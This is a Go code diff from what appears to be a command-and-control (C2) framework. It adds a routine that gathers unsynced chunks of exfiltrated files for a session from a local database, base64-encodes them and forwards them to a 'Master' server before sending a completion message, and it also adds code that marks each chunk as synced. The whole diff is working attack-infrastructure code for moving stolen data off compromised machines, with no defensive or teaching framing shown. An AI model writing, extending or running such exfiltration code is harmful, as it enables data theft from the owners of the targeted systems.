@@ -867,6 +867,11 @@ func (c2 *C2Manager) handleExfilCompletionFrame(tag string) (bool, error) {
 	}
 	c2.mutex.RUnlock()
 
+	// Flush any unsynced chunks for this session before sending completion
+	if c2.db != nil && masterClient != nil {
+		c2.syncSessionChunksToMaster(sessionID, totalChunks)
+	}
+
 	// Forward completion to Master with full details - Master handles assembly
 	if masterClient != nil {
 		req := ExfilCompleteRequest{
@@ -1243,6 +1248,61 @@ func (c2 *C2Manager) submitExfilChunkToMasterDirect(req ExfilChunkRequest, sessi
 
 	// Mark as synced in DB
 	if c2.db != nil {
+		if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil && c2.debug {
+			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
+		}
+	}
+}
+
+// syncSessionChunksToMaster syncs all unsynced chunks for a specific session to Master.
+// Called before sending completion to ensure all chunks are delivered.
+func (c2 *C2Manager) syncSessionChunksToMaster(sessionID string, totalChunks int) {
+	if c2.db == nil || masterClient == nil {
+		return
+	}
+
+	chunks, err := c2.db.GetUnsyncedExfilChunksForSession(sessionID, totalChunks)
+	if err != nil {
+		if c2.debug {
+			logf("[Exfil] Failed to query unsynced chunks for session %s: %v", sessionID, err)
+		}
+		return
+	}
+
+	if len(chunks) == 0 {
+		return
+	}
+
+	if c2.debug {
+		logf("[Exfil] Syncing %d unsynced chunks for session %s before completion", len(chunks), sessionID)
+	}
+
+	for _, chunk := range chunks {
+		chunkIndex := chunk["chunk_index"].(int)
+		data := chunk["data"].([]byte)
+		jobID := chunk["job_id"].(string)
+		fileName := chunk["file_name"].(string)
+		fileSize := chunk["file_size"].(int64)
+		chunkTotalChunks := chunk["total_chunks"].(int)
+
+		req := ExfilChunkRequest{
+			SessionID:   sessionID,
+			JobID:       jobID,
+			ChunkIndex:  chunkIndex,
+			TotalChunks: chunkTotalChunks,
+			PayloadB64:  base64.StdEncoding.EncodeToString(data),
+			FileName:    fileName,
+			FileSize:    fileSize,
+			IsFinal:     chunkTotalChunks > 0 && chunkIndex == chunkTotalChunks,
+		}
+
+		if _, err := masterClient.SubmitExfilChunk(req); err != nil {
+			if c2.debug {
+				logf("[Exfil] Failed to sync chunk %d for session %s: %v", chunkIndex, sessionID, err)
+			}
+			continue
+		}
+
 		if err := c2.db.MarkExfilChunkSynced(sessionID, chunkIndex); err != nil && c2.debug {
 			logf("[Exfil] Failed to mark chunk synced (session=%s idx=%d): %v", sessionID, chunkIndex, err)
 		}
